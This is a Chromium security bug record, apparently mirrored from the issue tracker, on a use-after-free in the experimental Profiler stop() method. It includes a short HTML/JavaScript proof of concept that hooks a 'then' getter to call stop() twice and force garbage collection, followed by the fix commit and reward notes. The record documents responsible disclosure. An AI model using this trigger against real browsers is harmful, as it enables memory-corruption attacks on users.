# Security:  UAF in StopProfiler

| Field | Value |
|-------|-------|
| **Issue ID** | [40053128](https://issues.chromium.org/issues/40053128) |
| **Status** | Accepted |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>PerformanceAPIs |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | ra...@gmail.com |
| **Assignee** | ac...@meta.com |
| **Created** | 2020-08-20 |
| **Bounty** | $7,500.00 |

## Description

**This template is ONLY for reporting security bugs. If you are reporting a**  

**Download Protection Bypass bug, please use the "Security - Download**  

**Protection" template. For all other reports, please use a different**  

**template.**

**Please READ THIS FAQ before filing a bug: <https://chromium.googlesource.com>**  

**/chromium/src/+/master/docs/security/faq.md**

**Please see the following link for instructions on filing security bugs:**  

**<https://www.chromium.org/Home/chromium-security/reporting-security-bugs>**

**Reports may be eligible for reward payments under the Chrome VRP:**  

**<http://g.co/ChromeBugRewards>**

**NOTE: Security bugs are normally made public once a fix has been widely**  

**deployed.**

**-------------------------**

**VULNERABILITY DETAILS**  

**Please provide a brief explanation of the security issue.**

**VERSION**  

Chrome Version: chrome stable, behind flags  

Operating System: all

**REPRODUCTION CASE**

resolve can call user-defined function. so we delete CpuProfile object calling stop twice [2]  

as a result, it cause UAF CpuProfile object.  

[1] <https://source.chromium.org/chromium/chromium/src/+/master:third_party/blink/renderer/core/timing/profiler_group.cc;drc=72aa50fa724be49fb2c59872b20bce365ab44c12;l=179>  

[2] <https://source.chromium.org/chromium/chromium/src/+/master:v8/src/profiler/cpu-profiler.cc;drc=1562cab3f1eda927938f8f4a5a91991fefde66d3;l=378>

<html>
<body<>
</body>
<script>
function gc() {
for (var i = 0; i < 0x100000; ++i) {
var a = new String();
}
}
async function main(){
var pf = await performance.profile({ sampleInterval: 10 });
console.log(pf);
cnt = 0;
Object.prototype.\_\_defineGetter\_\_("then", ()=>{
if( cnt == 0){
cnt ++;
console.log("hello");
pf.stop();
gc();
}
})
pf.stop();
}
main();
</script>
</html>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

**Type of crash: [tab, browser, etc.]**  

**Crash State: [see link above: stack trace \*with symbols\*, registers,**  

**exception record]**  

**Client ID (if relevant): [see link above]**

**CREDIT INFORMATION**  

**Externally reported security bugs may appear in Chrome release notes. If**  

**this bug is included, how would you like to be credited?**  

Reporter credit: WOOJIN OH

## Timeline

### ra...@gmail.com (2020-08-20)

need Experimental Web Platform features flag

### mp...@chromium.org (2020-08-21)

Thanks for the report. +acomminos@ can you take a look?

[Monorail components: Blink>PerformanceAPIs]

### bu...@chops-service-accounts.iam.gserviceaccount.com (2020-08-25)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/20c2923fbddff758ceb10e468786476249191b46

commit 20c2923fbddff758ceb10e468786476249191b46
Author: Andrew Comminos <acomminos@fb.com>
Date: Tue Aug 25 16:03:39 2020

Prevent synchronous script execution in Profiler::stop

Bug: 1119865
Change-Id: I916173d91453aebaf86e915b5bae85539a578ad1
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2373184
Reviewed-by: Nicolás Peña Moreno <npm@chromium.org>
Commit-Queue: Andrew Comminos <acomminos@fb.com>
Cr-Commit-Position: refs/heads/master@{#801394}

[modify] https://crrev.com/20c2923fbddff758ceb10e468786476249191b46/third_party/blink/renderer/core/timing/profiler.cc
[modify] https://crrev.com/20c2923fbddff758ceb10e468786476249191b46/third_party/blink/renderer/core/timing/profiler_group_test.cc


### ac...@meta.com (2020-08-25)

[Empty comment from Monorail migration]

### [Deleted User] (2020-08-25)

[Empty comment from Monorail migration]

### ad...@google.com (2020-08-31)

[Empty comment from Monorail migration]

### mm...@chromium.org (2020-09-08)

acomminos@, thank you for fixing this issue. Chrome Security team needs your knowledge to prevent that whole class of bugs from happening elsewhere. We would greatly appreciate if you could tell us more about the issue by filling out the following form: https://forms.gle/VWKDUv9a8GXCCRWm7

### np...@chromium.org (2020-09-08)

mmoroz@ also in case it's missed, note that this bug is for a web platform feature that is not shipped yet (requires enabling experimental web platform features to enable this experimental feature).

### ad...@google.com (2020-09-09)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### ad...@google.com (2020-09-09)

Congratulations! The VRP panel has decided to award $7,500 for this report.

### ad...@google.com (2020-09-10)

[Empty comment from Monorail migration]

### [Deleted User] (2020-12-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### is...@google.com (2020-12-01)

This issue was migrated from crbug.com/chromium/1119865?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40053128)*
